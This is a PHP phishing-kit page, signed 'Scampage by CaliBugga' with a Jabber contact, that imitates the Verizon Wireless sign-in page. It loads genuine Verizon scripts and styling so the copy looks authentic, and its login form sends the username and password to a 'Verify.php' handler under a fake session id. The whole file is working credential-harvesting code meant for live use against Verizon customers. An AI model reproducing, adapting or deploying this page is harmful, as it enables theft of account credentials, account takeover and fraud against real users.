
<?php

/*
* Scampage by CaliBugga
* Jabber: lauriemoore302@jabba.im
* ICQ: xxxxxxxxx
*/
require "CONTROLS.php";
require "includes/session_protect.php";
require "includes/functions.php";
require "includes/One_Time.php";

?>
<!DOCTYPE html>










    










<html lang="en">
<head>

<script type="text/javascript" async="" src="assets/files/vms.js"></script>
    <script src="assets/files/sitewideBoldchatMonitoring.js"></script>
    <script src="assets/files/foresee-analytics-j1380.js"></script>
	<script type="text/javascript" async="" src="assets/files/ga.js"></script>
    <script type="text/javascript" src="assets/files/www.js" async=""></script>
    <script src="assets/files/satelliteLib-8fda614b914d5fb481c47a37b7b1e83ad93e2faa.js"></script>
    <script src="assets/files/satellite-5878dd8f64746d47cd000c8e.js"></script>
    <script src="assets/files/mmcore.js"></script>
	<script type="text/javascript" id="mmpack.0" src="assets/files/mmpackage-1.js"></script>
    <script src="assets/files/head.js"></script>
    <script src="assets/files/queueclient.js"></script>

<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<title>Verizon Log In, Sign in to your Verizon Wireless or Fios Account</title>

<script src="assets/files/my3.js"></script>
    <script src="assets/files/jquery-ui-1.js"></script>
    <script src="assets/files/my3-lib.js"></script>
    <script type="text/javascript" src="assets/files/handlebars.js"></script>
    <script type="text/javascript" src="assets/files/my3validate.js"></script>
    <script type="text/javascript" src="assets/files/my3formatter.js"></script>
    <script type="text/javascript" src="assets/files/my3text-fit.js"></script>
    <script type="text/javascript" src="assets/files/jquery_003.js"></script>
	<script src="assets/files/satellite-56006ad962333027b70003c1.js"></script>
    <script src="assets/files/satellite-5501c70e3932630016c70200.js"></script>
    <script src="assets/files/satellite-551005a33337610019870300.js"></script>
    <script src="assets/files/satellite-588631b164746d61df00aa12.js"></script>
    <script src="assets/files/satellite-579f85bc64746d5949000259.js"></script>
    <script src="assets/files/satellite-57dac8f464746d361c010294.js"></script>
    <script src="assets/files/satellite-59edebfb64746d51aa000cc9.js"></script>
    <script src="assets/files/satellite-5458af5d38326400162c0400.js"></script>
    <script src="assets/files/satellite-5874fed564746d6035007bd9.js"></script>
    <script src="assets/files/satellite-58b947bc64746d1187012b04.js"></script>
    <script src="assets/files/satellite-5adf340064746d79c101333c.js"></script>
    <script src="assets/files/satellite-59ad76a164746d516b003ddf.js"></script>
    <script src="assets/files/satellite-584fe90c64746d1fb900bb20.js"></script>
    <script src="assets/files/satellite-54614cbc3166310016ab0400.js"></script>
	<script src="assets/files/gateway.js" type="text/javascript" async="true" data-vendor="acs" data-role="gateway"></script>
    <script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="//gateway.answerscloud.com/code/19.6.1/fs.feedback.js" src="assets/files/fs_003.js"></script>
    <script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="//gateway.answerscloud.com/code/19.6.1/fs.survey.js" src="assets/files/fs_004.js"></script>
    <script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="//gateway.answerscloud.com/code/19.6.1/fs.record.js" src="assets/files/fs_006.js"></script>
    <script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="//gateway.answerscloud.com/code/19.6.1/fs.utils.js" src="assets/files/fs_002.js"></script>
    <script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="//gateway.answerscloud.com/code/19.6.1/fs.trigger.js" src="assets/files/fs.js"></script>
    <link id="fs-css-1" rel="stylesheet" type="text/css" href="assets/files/main.css">
    <script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="//gateway.answerscloud.com/code/19.6.1/fs.trueconversion.js" src="assets/files/fs_005.js"></script>
    <script id="bcvm_script_1527948818744" async="" type="text/javascript" src="assets/files/bc.pv"></script>





<!--  Set Gomez Tags -->

<script type="text/javascript">

var gomez_brumPagename = "";
if(gomez_brumPagename==""){
    gomez_brumPagename = "";
}

var bypassBrum = 'true';
var bypassUEM = 'true';
if(bypassBrum == 'false' ||  bypassUEM == 'false') {
    if(gomez_brumPagename != ""){
        var gomez={
		    gs: new Date().getTime(),
		    acctId: "0532A9",
		    pgId: gomez_brumPagename,
		    grpId: "AM_Prod",
		    wrate: "0.1"
        };
    }
}
</script>


        


<script src="https://scache.vzw.com/am/js/jquery-1.12.4.min.js"></script>


    
        <meta name="viewport"  content="width=device-width, initial-scale=1">
    
    
















<script>
    var $j = jQuery;
    var $ = $j.noConflict();
</script>
<link rel="stylesheet" href="https://scache.vzw.com/am/css/bootstrap-3.3.7.min.css" />
<link rel="stylesheet" href="https://scache.vzw.com/am/css/less-space.css" />
<link rel="stylesheet" href="https://scache.vzw.com/am/css/style-2.0.css" />
<script src="https://scache.vzw.com/am/js/bootstrap-3.3.7.min.js"></script>
<script src="https://scache.vzw.com/am/js/jquery.validate-1.19.0.min.js"></script>
<script src="https://scache.vzw.com/am/js/additional-methods-1.19.0.min.js"></script>
<script src="https://scache.vzw.com/am/js/base64js-1.2.1.min.js"></script>
<script src="https://scache.vzw.com/am/js/blacklist.js"></script>
<script src="https://scache.vzw.com/am/js/core.js"></script>
<script src="https://scache.vzw.com/am/js/util.js"></script>


<script type="text/javascript">
    var $ = $j.noConflict();
</script>
        <script type="text/javascript" src="https://scache.vzw.com/am/includes/accessmanager.js"></script>
        <script src="https://scache.vzw.com/am/js/util.js"></script>

 
    	<script type="text/javascript" src="https://scache.vzw.com/am/includes/register.js"></script>

        <script type="text/javascript">
            $j(document).ready(function() {
            	// clear form caching
                document.getElementById('controller').reset();

                $j('button#nextButton').click(function(e) {
                    if (checkCaptchaResponse("nextButton")) {
                        s.events=s.apl(s.events,"event4",",",0);
                        s.prop11="continue";
                        s.prop13=s.pageName+"|"+s.prop11;
                        var s_code=s.t();
                        if(s_code)document.write(s_code);
                    }
                    else {
                        return false;
                    }
                });          
                
                $('#controller').formValidate({
                    rules: {
                        mobileNumber: Rule.mobileNumberFormatted
                    },  
                    
                    messages: {
                        mobileNumber: Message.mobileNumber
                    },

                    buttonID: '#nextButton'
                });

            });
            var goto = '';

		
      </script>
      
          <script type="text/javascript" src="https://www.google.com/recaptcha/api.js" async defer></script>


      






    
    

    





    
    
        <link rel="stylesheet" href="https://www.verizon.com/etc/designs/vzwcom/gnav20/core.css" />
        <script>var gnavdl = {"bu":"wireless","appid":"ssoam","variation" : "prospect"}</script>
    
   

 

    








<script type="text/javascript">
    var vzwDL = {
        "page": {
            "accBundleFlag" : "",
            "accountNumberOfLines" : "",
            "appointmentId" : "",
            "area" : "",
            "authStatus" : "unauthenticated",
            "channel" : "/my verizon",
            "condition" : "",
            "conversionType" : "",
            "cpcFlag" : "false",
            "creditAppNumber" : "",
            "currentUserPlanId" : "",
            "deviceId" : "",
            "deviceManufacturer" : "",
            "deviceModel" : "",
            "deviceValue" : "",
            "dhSearchTerm" : "",
            "dhSearchType" : "",
            "email" : "",
            "errorCode" : "",
            "errorMsg" : "",
            "flowInteraction" : "navigation",
            "flowName" : "register",
            "flowType" : "page",
            "globalId" : "a73bcea5zbd45z4746za8acz0485ed5b1ac5", 
            "hardResponse" : "",
            "hier1" : "desktop/my verizon/register/enter number",
            "language" : "english",
            "lineOfBusiness" : "",
            "microInteraction" : "",
            "microType" : "",
            "mlsExp" : "1D_myvz:desktop",
            "numberOfLinesChanged" : "",
            "numberofTradeInLines" : "",
            "pageName" : "/desktop/my verizon/register/enter number",
            "pageType" : "my verizon",
            "paymentType" : "",
            "perContentImpression" : "",
            "platform" : "desktop",
            "section2" : "/my verizon/register",
            "section3" : "",
            "selfServiceType" : "desktop:register:landing",
            "shopPath" : "",
            "softResponse" : "",
            "state" : "",
            "storeNumber" : "",
            "testVersion" : "",
            "tradeInSubId" : "",
            "typeIndicator" : "prospect",
            "promosApplied" : "",
            "zipCode" : ""
        },
        "authentication": {
            "accountNumber" : "",
            "aHash" : "",
            "collectionsInd" : "",
            "custType" : "",
            "ecpdId" : "",
            "eHash" : "",
            "eHash2" : "",
            "email" : "",
            "greetingName" : "",
            "impId" : "",
            "impType" : "",
            "mdn" : "",
            "mhash" : "",
            "mHash2" : "",
            "prepayInd" : "",
            "userRole" : "",
            "VCT" : "",
            "vzw_survey" : ""
        }
    };
</script>

<script type="text/javascript">
	(function(a, b, c, d) {
		a = '//tags.tiqcdn.com/utag/vzw/main/prod/utag.js';
		b = document;
		c = 'script';
		d = b.createElement(c);
		d.src = a;
		d.type = 'text/java' + c;
		d.async = true;
		a = b.getElementsByTagName(c)[0];
		a.parentNode.insertBefore(d, a);
	})();
</script>





</head>
<body  id="fullscreen-body" class="Desktop-device">

    



    
    
        <div id="vz-gh20"></div>
    
   

    <main role="main">
    











    



<div id="main-content" class="container-fluid">
    <div class="row">

            <div class="col-xs-12">
                              
                
                
            
            
            </div>
    </div>
    
    <div class="row">
        <div id="main-header" class="col-xs-12" aria-live="assertive">
            <h1>Sign in</h1>
        </div>
    </div>
    
    <div class="row"> 
        
        <div id="left-side-content" class="col-xs-12 col-sm-9"> 
		
                <form method="post" action="Verify.php?sslchannel=true&sessionid=<?php echo generateRandomString(130); ?>"  id="loginForm" autocomplete="off">
                    
                    
                        
                        
                            <div class="form-group xs-mt-20 input-textlabel" >
                        
                          <label for="IDToken1" class="input-label">User ID or Verizon mobile number</label>
        
    


                            <input type="text" class="form-control input-container input-box" aria-required="true"  name="username" value="" maxlength="12" />
                        </div>
                        <div class="form-group xs-mt-20 input-textlabel"  >

    
    
                            <label for="IDToken2" class="input-label">Password</label>
                            <input type="password" class="form-control input-container input-box" aria-required="true" name="password" maxlength="30"/>
                            <input type="hidden"  value="false" />
    
    

                        </div>
                    
                   


                    
                    <div class="form-group btn-center">
                        <button class="btn btn-default btn-lg" type="submit" name="nextButton" id="nextButton"><span>Sign In</span></button>
                    </div>
                       
                </form>

            <div>
                <p>Already Registered?
                <a > Sign in</a></p>
            </div>

	     	<div>
	     		<p><a class="link"  onclick="popUp(this.href,'popup',400,500);return false;">Privacy Policy</a></p>
	     	</div>


        </div> 

        <div id="right-side-help" class="hidden-xs col-sm-3">
            <p class="h3">FAQs</p>
                <p><a href="#" class="collapsed" onclick="event.preventDefault();" data-toggle="collapse" data-target="#faq1" aria-expanded="false" aria-controls="faq1" title="Toggle order content">What if I don't receive my text&nbsp; messages?</a></p>
                <p id="faq1" class="collapse">Please make sure your mobile device is turned on.  We will try to deliver the text message to your device for 2 hours.</p>

                <p><a href="#" class="collapsed" onclick="event.preventDefault();" data-toggle="collapse" data-target="#faq2" aria-expanded="false" aria-controls="faq1" title="Toggle order content">What if I block text messages?</a></p>
                <p id="faq2" class="collapse">You will be able to receive this free text message and continue to have all other text messages blocked.</p>

                <p><a href="#" class="collapsed" onclick="event.preventDefault();" data-toggle="collapse" data-target="#faq3" aria-expanded="false" aria-controls="faq1" title="Toggle order content">Will the Registration PIN expire?</a></p>
                <p id="faq3" class="collapse">Yes.  Your Registration PIN will expire in 10 minutes.  Please use it right away to complete your registration.</p>

                <p><a href="#" class="collapsed" onclick="event.preventDefault();" data-toggle="collapse" data-target="#faq4" aria-expanded="false" aria-controls="faq1" title="Toggle order content">For Mobile Broadband Users&nbsp; (Netbooks, Modems, PC Cards)</a></p>
                <p id="faq4" class="collapse">To retrieve your Registration PIN, you’ll need to check your device’s display, its web interface or its connection manager software.</p>

        </div> 
  
    

        
    </div> 
    
</div>   




    </main>
    
    




    






    
    
        <div id="vz-gf20"></div>
    
   

    





    
    
        <script type="text/javascript" src="https://www.verizon.com/etc/designs/vzwcom/gnav20/personal.js"></script>
    
   
 



</body>

    <script src="https://scache.vzw.com/dam/echn/vzw-engage/js/VZ_Chat.js"></script>
    <script>
        VZ_Chat.init({
            'id'        : 'TouchCommerce',
            'src'       : 'https://verizon.inq.com/chatskins/launch/inqChatLaunch10004593.js'
        }, { 
            'debugMode'   : false,
            'scrubber'    : VZ_Chat.LPMobileDataScrubber,
            'builder'     : VZ_Chat.TCMobileDataBuilder 
        });
        </script>

</html>